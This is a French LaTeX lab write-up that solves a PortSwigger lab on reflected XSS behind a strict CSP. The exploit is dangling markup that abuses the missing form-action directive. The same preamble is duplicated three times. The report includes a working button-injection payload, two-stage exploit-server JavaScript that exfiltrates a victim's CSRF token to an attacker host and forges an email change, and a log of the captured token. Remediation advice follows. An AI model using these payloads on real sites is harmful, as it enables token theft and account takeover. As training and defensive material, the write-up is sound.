% =====================================================================
%  Rapport de sécurité - Reflected XSS behind a strict CSP
%  Compilation : latexmk -pdf strict-csp-dangling-markup.tex
% =====================================================================
\documentclass[11pt,a4paper]{article}
% =====================================================================
%  Préambule commun - Rapports de sécurité
%  Inclus par chaque rapport après \documentclass, avant \begin{document} :
%      \documentclass[11pt,a4paper]{article}
%      % =====================================================================
%  Préambule commun - Rapports de sécurité
%  Inclus par chaque rapport après \documentclass, avant \begin{document} :
%      \documentclass[11pt,a4paper]{article}
%      % =====================================================================
%  Préambule commun - Rapports de sécurité
%  Inclus par chaque rapport après \documentclass, avant \begin{document} :
%      \documentclass[11pt,a4paper]{article}
%      \input{../../templates/preambule.tex}
%      \begin{document} ... \end{document}
%
%  Moteur : pdflatex (compiler deux fois pour la table des matières, ou
%  utiliser latexmk -pdf).
% =====================================================================

\usepackage[T1]{fontenc}
\usepackage[utf8]{inputenc}
\usepackage{lmodern}
\usepackage[french]{babel}
\usepackage{csquotes}
\frenchsetup{StandardItemLabels=true}
\usepackage{amsmath}

\usepackage[margin=2.5cm]{geometry}
\usepackage{graphicx}
\usepackage{float}
\usepackage{xcolor}
\usepackage{array}
\usepackage{booktabs}
\usepackage{enumitem}
\usepackage{listings}
\usepackage{tcolorbox}
\tcbuselibrary{skins,breakable}
\usepackage[hidelinks]{hyperref}

% ---------------------------------------------------------------------
%  Palette
% ---------------------------------------------------------------------
\definecolor{codebg}{RGB}{245,246,248}
\definecolor{codeframe}{RGB}{210,214,220}
\definecolor{codekw}{RGB}{170,40,60}
\definecolor{codestr}{RGB}{30,110,70}
\definecolor{codecmt}{RGB}{120,125,135}
\definecolor{accent}{RGB}{30,70,120}
\definecolor{warnbg}{RGB}{255,247,230}
\definecolor{warnframe}{RGB}{224,168,64}
\definecolor{keybg}{RGB}{235,240,248}
\definecolor{keyframe}{RGB}{120,150,190}

% ---------------------------------------------------------------------
%  Listings (blocs de code encadrés, monospace)
% ---------------------------------------------------------------------
\lstdefinestyle{report}{
  backgroundcolor=\color{codebg},
  frame=single,
  rulecolor=\color{codeframe},
  basicstyle=\ttfamily\small,
  keywordstyle=\color{codekw}\bfseries,
  stringstyle=\color{codestr},
  commentstyle=\color{codecmt}\itshape,
  numbers=none,
  breaklines=true,
  breakatwhitespace=false,
  showstringspaces=false,
  columns=fullflexible,
  keepspaces=true,
  xleftmargin=8pt,
  xrightmargin=8pt,
  aboveskip=10pt,
  belowskip=10pt,
  literate=%
    {é}{{\'e}}1 {è}{{\`e}}1 {ê}{{\^e}}1 {à}{{\`a}}1 {ç}{{\c c}}1
    {É}{{\'E}}1 {î}{{\^i}}1 {ï}{{\"i}}1 {ô}{{\^o}}1 {û}{{\^u}}1
    {ù}{{\`u}}1 {œ}{{\oe}}1 {»}{{\guillemotright}}1 {«}{{\guillemotleft}}1
}
\lstset{style=report}

% ---------------------------------------------------------------------
%  Captures d'écran : image + légende en italique (sans « Figure N »)
%  \shot{fichier.png}{légende}
%  Si l'image manque, un cadre de remplacement est affiché.
% ---------------------------------------------------------------------
\newcommand{\shot}[2]{%
  \begin{center}%
    \IfFileExists{images/#1}%
      {\includegraphics[width=0.92\linewidth]{images/#1}}%
      {\setlength{\fboxsep}{0pt}\fcolorbox{codeframe}{codebg}{%
         \parbox[c][3.2cm][c]{0.92\linewidth}{\centering\ttfamily\small
         images/#1\\[4pt]\normalfont\itshape(capture à ajouter)}}}%
    \\[5pt]{\itshape\small #2}%
  \end{center}%
}

% ---------------------------------------------------------------------
%  Encadrés « points clés » (bleu) et « attention » (orange)
% ---------------------------------------------------------------------
\newtcolorbox{keybox}[1][]{
  breakable, colback=keybg, colframe=keyframe, boxrule=0.6pt,
  arc=2pt, left=8pt, right=8pt, top=6pt, bottom=6pt, #1}
\newtcolorbox{warnbox}[1][]{
  breakable, colback=warnbg, colframe=warnframe, boxrule=0.6pt,
  arc=2pt, left=8pt, right=8pt, top=6pt, bottom=6pt, #1}

\setlist[itemize]{leftmargin=1.4em, itemsep=2pt, topsep=4pt}

% ---------------------------------------------------------------------
%  Page de garde + table des matières
%  \makecover{titre}{sous-titre}{lignes méta}{auteur}{date}
%  Les lignes méta s'écrivent avec \metarow{Étiquette}{Valeur}.
% ---------------------------------------------------------------------
\newcommand{\metarow}[2]{\textbf{#1} & #2 \\}
\newcommand{\makecover}[5]{%
  \begin{titlepage}
    \centering
    \vspace*{1.2cm}
    {\large\scshape Rapport de sécurité}\par
    \vspace{1.6cm}
    {\huge\bfseries #1\par}
    \vspace{0.5cm}
    {\Large #2\par}
    \vspace{2.2cm}
    \begin{tcolorbox}[width=0.86\textwidth, colback=codebg,
        colframe=codeframe, boxrule=0.8pt, arc=3pt, left=12pt, right=12pt,
        top=10pt, bottom=10pt]
      \renewcommand{\arraystretch}{1.35}%
      \begin{tabular}{@{}r@{\hspace{1.2em}}p{0.62\textwidth}@{}}
        #3
      \end{tabular}
    \end{tcolorbox}
    \vfill
    {\large #4\par}
    \vspace{0.3cm}
    {#5\par}
  \end{titlepage}
  \tableofcontents
  \newpage
}

%      \begin{document} ... \end{document}
%
%  Moteur : pdflatex (compiler deux fois pour la table des matières, ou
%  utiliser latexmk -pdf).
% =====================================================================

\usepackage[T1]{fontenc}
\usepackage[utf8]{inputenc}
\usepackage{lmodern}
\usepackage[french]{babel}
\usepackage{csquotes}
\frenchsetup{StandardItemLabels=true}
\usepackage{amsmath}

\usepackage[margin=2.5cm]{geometry}
\usepackage{graphicx}
\usepackage{float}
\usepackage{xcolor}
\usepackage{array}
\usepackage{booktabs}
\usepackage{enumitem}
\usepackage{listings}
\usepackage{tcolorbox}
\tcbuselibrary{skins,breakable}
\usepackage[hidelinks]{hyperref}

% ---------------------------------------------------------------------
%  Palette
% ---------------------------------------------------------------------
\definecolor{codebg}{RGB}{245,246,248}
\definecolor{codeframe}{RGB}{210,214,220}
\definecolor{codekw}{RGB}{170,40,60}
\definecolor{codestr}{RGB}{30,110,70}
\definecolor{codecmt}{RGB}{120,125,135}
\definecolor{accent}{RGB}{30,70,120}
\definecolor{warnbg}{RGB}{255,247,230}
\definecolor{warnframe}{RGB}{224,168,64}
\definecolor{keybg}{RGB}{235,240,248}
\definecolor{keyframe}{RGB}{120,150,190}

% ---------------------------------------------------------------------
%  Listings (blocs de code encadrés, monospace)
% ---------------------------------------------------------------------
\lstdefinestyle{report}{
  backgroundcolor=\color{codebg},
  frame=single,
  rulecolor=\color{codeframe},
  basicstyle=\ttfamily\small,
  keywordstyle=\color{codekw}\bfseries,
  stringstyle=\color{codestr},
  commentstyle=\color{codecmt}\itshape,
  numbers=none,
  breaklines=true,
  breakatwhitespace=false,
  showstringspaces=false,
  columns=fullflexible,
  keepspaces=true,
  xleftmargin=8pt,
  xrightmargin=8pt,
  aboveskip=10pt,
  belowskip=10pt,
  literate=%
    {é}{{\'e}}1 {è}{{\`e}}1 {ê}{{\^e}}1 {à}{{\`a}}1 {ç}{{\c c}}1
    {É}{{\'E}}1 {î}{{\^i}}1 {ï}{{\"i}}1 {ô}{{\^o}}1 {û}{{\^u}}1
    {ù}{{\`u}}1 {œ}{{\oe}}1 {»}{{\guillemotright}}1 {«}{{\guillemotleft}}1
}
\lstset{style=report}

% ---------------------------------------------------------------------
%  Captures d'écran : image + légende en italique (sans « Figure N »)
%  \shot{fichier.png}{légende}
%  Si l'image manque, un cadre de remplacement est affiché.
% ---------------------------------------------------------------------
\newcommand{\shot}[2]{%
  \begin{center}%
    \IfFileExists{images/#1}%
      {\includegraphics[width=0.92\linewidth]{images/#1}}%
      {\setlength{\fboxsep}{0pt}\fcolorbox{codeframe}{codebg}{%
         \parbox[c][3.2cm][c]{0.92\linewidth}{\centering\ttfamily\small
         images/#1\\[4pt]\normalfont\itshape(capture à ajouter)}}}%
    \\[5pt]{\itshape\small #2}%
  \end{center}%
}

% ---------------------------------------------------------------------
%  Encadrés « points clés » (bleu) et « attention » (orange)
% ---------------------------------------------------------------------
\newtcolorbox{keybox}[1][]{
  breakable, colback=keybg, colframe=keyframe, boxrule=0.6pt,
  arc=2pt, left=8pt, right=8pt, top=6pt, bottom=6pt, #1}
\newtcolorbox{warnbox}[1][]{
  breakable, colback=warnbg, colframe=warnframe, boxrule=0.6pt,
  arc=2pt, left=8pt, right=8pt, top=6pt, bottom=6pt, #1}

\setlist[itemize]{leftmargin=1.4em, itemsep=2pt, topsep=4pt}

% ---------------------------------------------------------------------
%  Page de garde + table des matières
%  \makecover{titre}{sous-titre}{lignes méta}{auteur}{date}
%  Les lignes méta s'écrivent avec \metarow{Étiquette}{Valeur}.
% ---------------------------------------------------------------------
\newcommand{\metarow}[2]{\textbf{#1} & #2 \\}
\newcommand{\makecover}[5]{%
  \begin{titlepage}
    \centering
    \vspace*{1.2cm}
    {\large\scshape Rapport de sécurité}\par
    \vspace{1.6cm}
    {\huge\bfseries #1\par}
    \vspace{0.5cm}
    {\Large #2\par}
    \vspace{2.2cm}
    \begin{tcolorbox}[width=0.86\textwidth, colback=codebg,
        colframe=codeframe, boxrule=0.8pt, arc=3pt, left=12pt, right=12pt,
        top=10pt, bottom=10pt]
      \renewcommand{\arraystretch}{1.35}%
      \begin{tabular}{@{}r@{\hspace{1.2em}}p{0.62\textwidth}@{}}
        #3
      \end{tabular}
    \end{tcolorbox}
    \vfill
    {\large #4\par}
    \vspace{0.3cm}
    {#5\par}
  \end{titlepage}
  \tableofcontents
  \newpage
}

%      \begin{document} ... \end{document}
%
%  Moteur : pdflatex (compiler deux fois pour la table des matières, ou
%  utiliser latexmk -pdf).
% =====================================================================

\usepackage[T1]{fontenc}
\usepackage[utf8]{inputenc}
\usepackage{lmodern}
\usepackage[french]{babel}
\usepackage{csquotes}
\frenchsetup{StandardItemLabels=true}
\usepackage{amsmath}

\usepackage[margin=2.5cm]{geometry}
\usepackage{graphicx}
\usepackage{float}
\usepackage{xcolor}
\usepackage{array}
\usepackage{booktabs}
\usepackage{enumitem}
\usepackage{listings}
\usepackage{tcolorbox}
\tcbuselibrary{skins,breakable}
\usepackage[hidelinks]{hyperref}

% ---------------------------------------------------------------------
%  Palette
% ---------------------------------------------------------------------
\definecolor{codebg}{RGB}{245,246,248}
\definecolor{codeframe}{RGB}{210,214,220}
\definecolor{codekw}{RGB}{170,40,60}
\definecolor{codestr}{RGB}{30,110,70}
\definecolor{codecmt}{RGB}{120,125,135}
\definecolor{accent}{RGB}{30,70,120}
\definecolor{warnbg}{RGB}{255,247,230}
\definecolor{warnframe}{RGB}{224,168,64}
\definecolor{keybg}{RGB}{235,240,248}
\definecolor{keyframe}{RGB}{120,150,190}

% ---------------------------------------------------------------------
%  Listings (blocs de code encadrés, monospace)
% ---------------------------------------------------------------------
\lstdefinestyle{report}{
  backgroundcolor=\color{codebg},
  frame=single,
  rulecolor=\color{codeframe},
  basicstyle=\ttfamily\small,
  keywordstyle=\color{codekw}\bfseries,
  stringstyle=\color{codestr},
  commentstyle=\color{codecmt}\itshape,
  numbers=none,
  breaklines=true,
  breakatwhitespace=false,
  showstringspaces=false,
  columns=fullflexible,
  keepspaces=true,
  xleftmargin=8pt,
  xrightmargin=8pt,
  aboveskip=10pt,
  belowskip=10pt,
  literate=%
    {é}{{\'e}}1 {è}{{\`e}}1 {ê}{{\^e}}1 {à}{{\`a}}1 {ç}{{\c c}}1
    {É}{{\'E}}1 {î}{{\^i}}1 {ï}{{\"i}}1 {ô}{{\^o}}1 {û}{{\^u}}1
    {ù}{{\`u}}1 {œ}{{\oe}}1 {»}{{\guillemotright}}1 {«}{{\guillemotleft}}1
}
\lstset{style=report}

% ---------------------------------------------------------------------
%  Captures d'écran : image + légende en italique (sans « Figure N »)
%  \shot{fichier.png}{légende}
%  Si l'image manque, un cadre de remplacement est affiché.
% ---------------------------------------------------------------------
\newcommand{\shot}[2]{%
  \begin{center}%
    \IfFileExists{images/#1}%
      {\includegraphics[width=0.92\linewidth]{images/#1}}%
      {\setlength{\fboxsep}{0pt}\fcolorbox{codeframe}{codebg}{%
         \parbox[c][3.2cm][c]{0.92\linewidth}{\centering\ttfamily\small
         images/#1\\[4pt]\normalfont\itshape(capture à ajouter)}}}%
    \\[5pt]{\itshape\small #2}%
  \end{center}%
}

% ---------------------------------------------------------------------
%  Encadrés « points clés » (bleu) et « attention » (orange)
% ---------------------------------------------------------------------
\newtcolorbox{keybox}[1][]{
  breakable, colback=keybg, colframe=keyframe, boxrule=0.6pt,
  arc=2pt, left=8pt, right=8pt, top=6pt, bottom=6pt, #1}
\newtcolorbox{warnbox}[1][]{
  breakable, colback=warnbg, colframe=warnframe, boxrule=0.6pt,
  arc=2pt, left=8pt, right=8pt, top=6pt, bottom=6pt, #1}

\setlist[itemize]{leftmargin=1.4em, itemsep=2pt, topsep=4pt}

% ---------------------------------------------------------------------
%  Page de garde + table des matières
%  \makecover{titre}{sous-titre}{lignes méta}{auteur}{date}
%  Les lignes méta s'écrivent avec \metarow{Étiquette}{Valeur}.
% ---------------------------------------------------------------------
\newcommand{\metarow}[2]{\textbf{#1} & #2 \\}
\newcommand{\makecover}[5]{%
  \begin{titlepage}
    \centering
    \vspace*{1.2cm}
    {\large\scshape Rapport de sécurité}\par
    \vspace{1.6cm}
    {\huge\bfseries #1\par}
    \vspace{0.5cm}
    {\Large #2\par}
    \vspace{2.2cm}
    \begin{tcolorbox}[width=0.86\textwidth, colback=codebg,
        colframe=codeframe, boxrule=0.8pt, arc=3pt, left=12pt, right=12pt,
        top=10pt, bottom=10pt]
      \renewcommand{\arraystretch}{1.35}%
      \begin{tabular}{@{}r@{\hspace{1.2em}}p{0.62\textwidth}@{}}
        #3
      \end{tabular}
    \end{tcolorbox}
    \vfill
    {\large #4\par}
    \vspace{0.3cm}
    {#5\par}
  \end{titlepage}
  \tableofcontents
  \newpage
}


\begin{document}

\makecover
  {Reflected XSS behind a strict CSP}
  {CWE-79 \textperiodcentered{} OWASP A03\string:2021}
  {
    \metarow{Lab}{Reflected XSS protected by very strict CSP, with dangling markup attack}
    \metarow{Classe}{Cross-Site Scripting}
    \metarow{Difficulté}{Practitioner}
    \metarow{Cible}{Côté client (DOM du navigateur), Content-Security-Policy}
    \metarow{Plateforme}{PortSwigger Web Security Academy}
  }
  {Lucas Fagioli}
  {22 juin 2026}

% =====================================================================
\section{Contexte}
% =====================================================================
La page "My account" reflète la valeur du paramètre d'URL
\texttt{email} directement dans l'attribut \texttt{value} du formulaire de
changement d'adresse : un point d'injection XSS d'école. La difficulté vient
d'une Content-Security-Policy très stricte : elle n'autorise scripts et images
que depuis \texttt{'self'}, si bien qu'une charge \lstinline|<script>|
classique ne s'exécute jamais et qu'une balise \lstinline|<img src=//attaquant>|
est bloquée.

Injecter du balisage reste possible même quand exécuter du script ne l'est pas.
La CSP définit \texttt{script-src}, \texttt{img-src}, \texttt{object-src} et
\texttt{base-uri}, mais elle oublie la directive \texttt{form-action}. Cet oubli
permet à du balisage injecté de détourner la destination du formulaire existant,
ce qui suffit à voler le jeton anti-CSRF d'une victime et à changer son adresse
e-mail, sans qu'aucun JavaScript ne s'exécute sur la page cible.

\begin{itemize}
  \item \textbf{Point d'injection} : le paramètre \texttt{email} sur \texttt{/my-account}.
  \item \textbf{Défense en place} : CSP stricte, mais sans \texttt{form-action}.
  \item \textbf{Valeur à voler} : le jeton CSRF de la victime (champ caché du formulaire).
  \item \textbf{Objectif} : exfiltrer le jeton CSRF via un contrôle de formulaire injecté, puis l'utiliser pour changer l'adresse e-mail de la victime.
\end{itemize}

\subsection{Environnement}
\renewcommand{\arraystretch}{1.3}
\begin{tabular}{@{}p{0.30\textwidth}p{0.62\textwidth}@{}}
  \textbf{Système}         & Windows 11 \\
  \textbf{Outil principal} & Burp Suite Community Edition \\
  \textbf{Navigateur}      & Chromium intégré à Burp (Open Browser) \\
  \textbf{Serveur d'exploit} & Exploit server PortSwigger (héberge la page, journal d'accès) \\
  \textbf{Cible}           & Instance de lab PortSwigger, \texttt{*.web-security-academy.net} \\
\end{tabular}

\shot{01-lab-not-solved.png}{État initial du lab, non résolu.}

On se connecte à la cible avec les identifiants fournis (\texttt{wiener} /
\texttt{peter}).

\shot{02-login.png}{Connexion en tant que wiener.}

Sur la page "My account", l'adresse e-mail se modifie via un formulaire
qui poste vers \texttt{/my-account/change-email} et porte un jeton CSRF caché :
c'est cette valeur que l'on volera à la victime.

\shot{03-account-page.png}{Page "My account" avec le formulaire de changement d'e-mail.}

% =====================================================================
\section{Reconnaissance}
% =====================================================================

\subsection{Trouver la réflexion}
En visitant \lstinline|/my-account?email=test"><h1>canary</h1>|, on constate
que le paramètre est reflété dans le formulaire. Le \lstinline|">| ferme
l'attribut \texttt{value} et le \lstinline|<h1>| atterrit dans la page comme du
vrai balisage, ce qui confirme une injection en contexte HTML.

\shot{04-canary-url.png}{Charge témoin (canary) dans l'URL.}

Dans Burp, la réponse le confirme : le balisage injecté sort du
\texttt{value="..."} du champ e-mail, et le champ caché \texttt{csrf} se trouve
juste après, dans le même \texttt{<form>}.

\begin{lstlisting}
<input required type="email" name="email" value="test"><h1>canary</h1>">
<input required type="hidden" name="csrf" value="TWOX2lPe1ZCXgFENuKavnX4yXw3kD9AK">
<button class='button' type='submit'> Update email </button>
\end{lstlisting}

\subsection{Lire la CSP}
La même réponse porte la politique qui bloque la voie facile :

\begin{lstlisting}
Content-Security-Policy: default-src 'self'; object-src 'none'; style-src 'self';
                         script-src 'self'; img-src 'self'; base-uri 'none';
\end{lstlisting}

\texttt{script-src 'self'} tue les scripts inline et externes ;
\texttt{img-src 'self'} tue les balises image utilisées comme mouchard.
Surtout, il n'y a pas de \texttt{form-action} : un formulaire peut donc poster
vers n'importe quelle origine, y compris un serveur contrôlé par l'attaquant.

\shot{05-reflection-and-csp.png}{Canary reflété et en-tête CSP stricte dans Burp.}

% =====================================================================
\section{Exploitation}
% =====================================================================

\subsection{L'idée : contourner la CSP par form-action}
Puisque le jeton CSRF vit dans un champ caché du formulaire, et que la
destination du formulaire n'est pas contrainte par \texttt{form-action}, on
sort de l'attribut \texttt{email} pour injecter un bouton dont le
\texttt{formaction} pointe vers notre serveur d'exploit et dont le
\texttt{formmethod} est \texttt{get}. Le bouton fait partie du formulaire
d'origine : le soumettre envoie tous les champs, jeton CSRF compris, dans la
chaîne de requête, sans le moindre JavaScript.

\begin{lstlisting}
foo@bar.com"><button formaction="https://<exploit>.exploit-server.net/exploit"
formmethod="get">Click me</button>
\end{lstlisting}

Charger cette URL sur la cible affiche le bouton "Click me" injecté dans
le formulaire du compte.

\shot{06-injected-button.png}{Bouton "Click me" injecté sur la cible.}

Deux détails font la différence entre une charge qui a l'air correcte et une
qui se déclenche vraiment : l'e-mail doit être valide. Le champ est
\lstinline|<input required type="email">| ; une valeur comme \texttt{test}
échoue à la validation HTML5 et le navigateur refuse silencieusement de
soumettre. Commencer la charge par \texttt{foo@bar.com} rend le champ valide
pour que la soumission passe. C'est précisément pour cela qu'une première
livraison n'avait rien capturé : la victime avait "cliqué", mais le
navigateur bloquait le formulaire invalide.

\subsection{Automatiser les deux étapes sur le serveur d'exploit}
Une seule page hébergée sur \texttt{/exploit} gère les deux étapes. Sans
paramètre \texttt{csrf}, elle redirige la victime vers la page vulnérable
portant la charge du bouton ; une fois le bouton soumis en retour avec
\texttt{?csrf=...}, la même page construit un formulaire POST vers le point de
changement d'e-mail, avec le jeton volé, et le soumet automatiquement.

\begin{lstlisting}[language=HTML]
<body>
<script>
const lab = 'https://<lab-id>.web-security-academy.net/';
const exploit = 'https://<exploit>.exploit-server.net/exploit';
const params = new URLSearchParams(location.search);

if (params.has('csrf')) {
    // Etape 2 : on a le jeton de la victime -> on forge le changement d'e-mail
    const f = document.createElement('form');
    f.method = 'POST';
    f.action = lab + 'my-account/change-email';
    f.innerHTML =
         '<input name="csrf" value="' + params.get('csrf') + '">' +
         '<input name="email" value="hacker@evil-user.net">';
    document.documentElement.appendChild(f);
    f.submit();
} else {
    // Etape 1 : on envoie la victime sur la page vulnerable avec le bouton injecte
    location = lab + 'my-account?email=' + encodeURIComponent(
         'foo@bar.com"><button formaction="' + exploit + '" formmethod="get">Click me</button>'
    );
}
</script>
</body>
\end{lstlisting}

\shot{07-exploit-server-script.png}{Serveur d'exploit hébergeant le script en deux étapes.}

Le script doit s'exécuter après l'existence d'un \texttt{body}, et ajouter au
\texttt{documentElement}. Une première version, sans \texttt{<body>} et
appelant \texttt{document.body.appendChild(...)}, s'exécutait pendant l'analyse
de l'en-tête : \texttt{document.body} valait \texttt{null}, le formulaire
n'était jamais construit et le POST ne partait pas (la page restait blanche).
Envelopper le script dans \texttt{<body>} et ajouter à
\texttt{document.documentElement} corrige cela ; c'était la raison pour
laquelle la victime rebouclait plusieurs fois sur \texttt{/exploit?csrf=...}
sans que l'e-mail ne change jamais.

Après soumission du bouton, le champ e-mail contient simplement
\texttt{foo@bar.com} ; le champ précieux est le jeton CSRF qui l'accompagne.

\shot{08-injected-email-field.png}{Champ e-mail portant la valeur injectée.}

\subsection{Livrer à la victime et capturer le jeton}
Cliquer sur "Deliver exploit to victim" joue la chaîne contre
l'utilisateur simulé. Le journal d'accès du serveur d'exploit montre la victime
récupérant \texttt{/exploit/}, puis renvoyant le jeton dans la chaîne de
requête :

\begin{lstlisting}
10.0.4.213 "GET /exploit/"                                             200 (Victim)
10.0.4.213 "GET /exploit?email=foo%40bar.com&csrf=WZtQLUZaMfTg0A5HawYiQiznBFJsejcX" 200 (Victim)
\end{lstlisting}

Le jeton CSRF de la victime (\texttt{WZtQ...}, différent du mien,
\texttt{TWOX...}) a été exfiltré, et l'étape 2 le rejoue aussitôt en POST pour
changer l'adresse e-mail.

\shot{09-token-captured.png}{Jeton CSRF de la victime capturé dans le journal d'accès.}

\subsection{Résolution du lab}
L'adresse de la victime ayant été changée avec son propre jeton volé, le lab
passe à l'état résolu.

\shot{10-lab-solved.png}{Lab résolu.}

% =====================================================================
\section{Impact}
% =====================================================================
Une CSP stricte relève la barre mais n'est pas une solution miracle. Un
attaquant capable d'injecter du balisage peut toujours voler des données
sensibles présentes dans la page (jetons CSRF, secrets, valeurs partielles de
formulaire) en détournant un formulaire existant lorsque \texttt{form-action}
manque, et cela sans aucune exécution de script. Ici, cela mène à forger pour
le compte de la victime une action protégée par CSRF (prise de contrôle de
l'e-mail, marchepied classique vers la prise de contrôle du compte). L'attaque
exige que la victime suive un lien préparé, mais ne demande aucun privilège du
côté de l'attaquant.

Gravité indicative : \textbf{élevée}.

% =====================================================================
\section{Remédiation}
% =====================================================================
La cause racine est du balisage attaquant émis tel quel dans la page.

\begin{itemize}
  \item \textbf{Correctif principal} : encoder en sortie toute donnée reflétée selon son contexte, pour que du balisage contrôlé par l'attaquant ne puisse jamais être émis dans la page. La valeur \texttt{email} doit être encodée pour un contexte d'attribut HTML.
  \item \textbf{Ne pas se reposer sur la seule CSP} : la CSP atténue l'exécution de script mais n'empêche pas le vol de données par détournement de formulaire ; c'est une défense en profondeur, pas un correctif.
  \item \textbf{Combler la faille de politique} : définir une directive \texttt{form-action} restrictive (et revoir \texttt{base-uri}, déjà verrouillée ici) pour que les formulaires ne puissent pas poster vers des origines arbitraires.
  \item \textbf{Protéger le secret} : cantonner et faire tourner les jetons CSRF ; éviter de rendre des secrets là où une injection de balisage peut les capturer.
  \item \textbf{Échappement automatique du framework} : préférer un moteur de gabarits qui échappe par défaut.
\end{itemize}

\vspace{4pt}
\noindent\emph{Référence} : OWASP XSS Prevention Cheat Sheet ; PortSwigger
"Dangling markup injection" et "Content Security Policy" ;
CWE-79.

\end{document}
